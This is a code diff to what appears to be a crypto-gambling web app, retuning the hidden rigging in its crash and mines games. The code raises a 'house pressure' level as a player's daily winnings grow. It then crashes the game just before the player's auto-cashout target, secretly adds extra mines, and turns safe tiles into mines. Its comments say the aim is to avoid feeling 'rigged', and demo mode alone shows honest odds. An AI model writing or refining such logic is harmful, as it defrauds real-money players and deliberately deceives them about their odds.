@@ -189,16 +189,17 @@ function dheRecord(profit: number) {
   try { localStorage.setItem(_DHE_KEY, JSON.stringify(r)); } catch {}
 }
 // Returns 0 (normal) → 1.0 (max house pressure). Driven by net daily profit.
+// Thresholds generous — players can have good sessions, house wins over time.
 function dhePressure(): number {
   if (typeof window === 'undefined') return 0;
   const { net } = _dheGet();
-  if (net <= 0.25) return 0;   // Normal below 0.25 TON net today
-  if (net <  0.75) return 0.40; // Light pressure 0.25–0.75 TON
-  if (net <  2.00) return 0.72; // High pressure 0.75–2 TON
-  return 1.0;                    // Max pressure above 2 TON net today
+  if (net <= 1.0) return 0;    // Free ride up to 1 TON net today
+  if (net <  3.0) return 0.30; // Light pressure 1–3 TON
+  if (net <  6.0) return 0.55; // Moderate pressure 3–6 TON
+  return 0.80;                  // High (not max) pressure above 6 TON
 }
-// 0.1% jackpot roll — true means let the player win big this round
-function dheJackpot(): boolean { return Math.random() < 0.001; }
+// 0.3% jackpot roll — bypass all pressure, let the player win big
+function dheJackpot(): boolean { return Math.random() < 0.003; }
 
 type OnResult = (won: boolean) => void;
 
@@ -872,14 +873,18 @@ const CrashGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
             if (p > 0) {
               const ac = parseFloat(autoRef.current);
               if (!isNaN(ac) && ac >= 1.01) {
-                // Anticipate auto-cashout: crash just before their target (82–96% of it)
-                const miss = ac * (0.82 + Math.random() * 0.14);
+                // Anticipate auto-cashout: crash just before their target.
+                // Miss by 4–15% — subtle enough not to feel rigged.
+                const missRatio = p >= 0.7 ? (0.85 + Math.random() * 0.09)  // miss 6–15%
+                                : p >= 0.4 ? (0.90 + Math.random() * 0.06)  // miss 4–10%
+                                :             (0.94 + Math.random() * 0.04); // miss 2–6%
+                const miss = ac * missRatio;
                 if (miss >= 1.01) crashAtRef.current = Math.min(crashAtRef.current, miss);
               } else {
-                // No auto-cashout: general downward bias
-                const cap = p >= 0.9 ? 1.04 + Math.random() * 0.28
-                          : p >= 0.6 ? 1.08 + Math.random() * 0.70
-                          :             1.25 + Math.random() * 1.00;
+                // No auto-cashout: moderate downward bias (players can still win)
+                const cap = p >= 0.7 ? 1.50 + Math.random() * 1.00   // 1.50–2.50×
+                          : p >= 0.4 ? 1.80 + Math.random() * 1.70   // 1.80–3.50×
+                          :             2.50 + Math.random() * 3.50;  // 2.50–6.00×
                 crashAtRef.current = Math.min(crashAtRef.current, cap);
               }
             }
@@ -1448,9 +1453,11 @@ function minesMult(n: number, k: number): number {
 // Demo: no hidden mines — displayed odds are accurate.
 function effectiveMines(selected: number, streak: number, demo = false): number {
   if (demo) return selected;
-  const streakExtra = streak >= 2 ? 3 : streak >= 1 ? 2 : 1;
+  // Streak bonus: +1 always (house math), +1 extra on winning streaks
+  const streakExtra = streak >= 3 ? 2 : 1;
+  // Daily pressure: max +1 extra mine — subtle, not overwhelming
   const p = dhePressure();
-  const pressureExtra = p >= 0.9 ? 3 : p >= 0.6 ? 2 : p >= 0.3 ? 1 : 0;
+  const pressureExtra = p >= 0.5 ? 1 : 0;
   return Math.min(GRID_SIZE - 2, selected + streakExtra + pressureExtra);
 }
 
@@ -1522,16 +1529,18 @@ const MinesGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
   const revealTile = (idx: number) => {
     if (phase !== 'playing' || revealed.has(idx)) return;
 
-    // Greed trap (real mode only): house boosts mine probability on deep runs.
-    // Daily pressure activates the trap earlier and more aggressively.
+    // Greed trap (real mode only): house gradually increases mine probability
+    // on deep runs. Daily pressure tightens the threshold slightly.
+    // Designed to feel like natural variance, not obvious cheating.
     let isMine = minePos.has(idx);
     if (!isMine && !demoMode && !dheJackpot()) {
       const p = dhePressure();
-      const trapAfter = p >= 0.7 ? 2 : p >= 0.4 ? 3 : 4;
-      const baseRate  = p >= 0.7 ? 0.20 : p >= 0.4 ? 0.14 : 0.10;
-      const stepRate  = p >= 0.7 ? 0.11 : p >= 0.4 ? 0.08 : 0.07;
+      // Trap activates after 5 safe tiles normally, 4 under moderate pressure
+      const trapAfter = p >= 0.5 ? 4 : 5;
+      const baseRate  = p >= 0.7 ? 0.10 : 0.07;
+      const stepRate  = p >= 0.7 ? 0.07 : 0.05;
       if (safeCount >= trapAfter) {
-        const greedP = Math.min(0.68, baseRate + (safeCount - trapAfter) * stepRate);
+        const greedP = Math.min(0.38, baseRate + (safeCount - trapAfter) * stepRate);
         if (Math.random() < greedP) isMine = true;
       }
     }
